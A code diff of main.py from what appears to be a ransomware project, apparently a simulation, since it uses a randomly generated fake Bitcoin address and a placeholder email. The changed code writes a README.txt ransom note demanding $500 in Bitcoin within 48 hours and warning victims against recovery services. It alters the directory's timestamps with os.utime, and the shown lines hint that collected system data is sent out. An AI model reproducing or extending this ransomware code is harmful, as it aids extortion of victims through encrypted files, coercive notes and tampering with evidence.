@@ -1,13 +1,15 @@
+# main.py
+
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM          # AESGCM protocol suite
-from typing import List, Dict, Union, Any
-from rich.console import Console
 from informations import collect_system_information
 from exceptions import HornetRansomwareException
+from typing import List, Dict, Union, Any
+from rich.console import Console
+from datetime import datetime, timezone, timedelta
 import requests
 import secrets
 import os
 import json
-from datetime import datetime, timezone, timedelta
 import pytz
 import time
 import random
@@ -163,35 +165,37 @@ def generate_key() -> bytes:
     return secrets.token_bytes(32)
 
 
-def write_note(filepath):
+def write_note(filepath: str) -> None:
     """
-    
-    leave ransomnote at filepath.
-
+   leave a ransomnote at filepath.
     """
     time.sleep(10)
     time_now = datetime.now(pytz.timezone('US/Eastern'))
-    secret = int(time_now.timestamp() * 1e9)
-    file_name = "Readme.txt"
+    secret   = secrets.randbelow(int(time_now.timestamp()))
+
+    # For now, to be realistic, we will create a random data into the changing data.
+    fake_btc_address = ''.join(random.choices("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz", k=34))
+    fake_email_address = "kn1ghtz@hacker.one.fake"
+
+    file_name = "README.txt"
     note = os.path.join(filepath, file_name) 
     with open(note, "w") as file:
-        file.write("!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\n\n")
-        file.write("All your important files are encrypted with a strong algorithm. You will not be able to access your files without the decryption key.\n\n")
-        file.write("To restore your files:\n")
-        file.write("1. Do NOT attempt to delete or modify the encrypted files. This may result in permanent data loss.\n")
-        file.write("2. You need to purchase the decryption key from us.\n\n")
-        file.write("Payment Instructions:\n")
-        file.write("- Send $500 worth of Bitcoin to the following address:\n")
-        file.write("  [Bitcoin_Wallet_Address]\n")
-        file.write("- After the payment is completed, send an email with your unique ID to: [attacker_email@example.com]\n\n")
-        file.write("Your unique ID: [UNIQUE_ID]\n\n")
-        file.write("Failure to comply within 72 hours will result in the permanent loss of your data.\n\n")
-        file.write("Remember:\n")
-        file.write("- Do NOT attempt to decrypt the files yourself.\n")
-        file.write("- Do NOT contact any third-party recovery services as they will not help you.\n\n")
-        file.write("We are the only ones who can help you recover your data.\n")
-        file.write("\n[The Ransomware Team]")
-    print(f"Randsome note created at {filepath}")
+        note = f"""
+        !!! Your files have been encrypted !!!
+        All your important files are encrypted with a strong algorithm. You will not be able to access your files without the decryption key.
+        To restore your files:
+        1. Do NOT attempt to delete or modify the encrypted files. This may result in permanent data loss.
+        2. Purchase Bitcoin worth $500 and send it to the following address: {fake_btc_address}
+        3. Contact to us({fake_email_address}), and we'll handle your decryption procedure. 
+
+        Remember:
+        - Do NOT attempt to decrypt the files yourself. 
+        - Do NOT contact any third-party recovery services as they will not help you. 
+        - Failure to comply with these instructions in 48 hours will result in the loss of your files.
+        """
+        file.write(note)
+
+    print(f"Ransomnote created at {filepath}")
 
     os.utime(filepath, (secret, secret))
 
@@ -224,5 +228,5 @@ if __name__ == "__main__":
         console.log("Failed to send the data.")
 
     # :p
-    key = "nothing"
+    key     = "nothing"
     key_hex = "0xnothing"
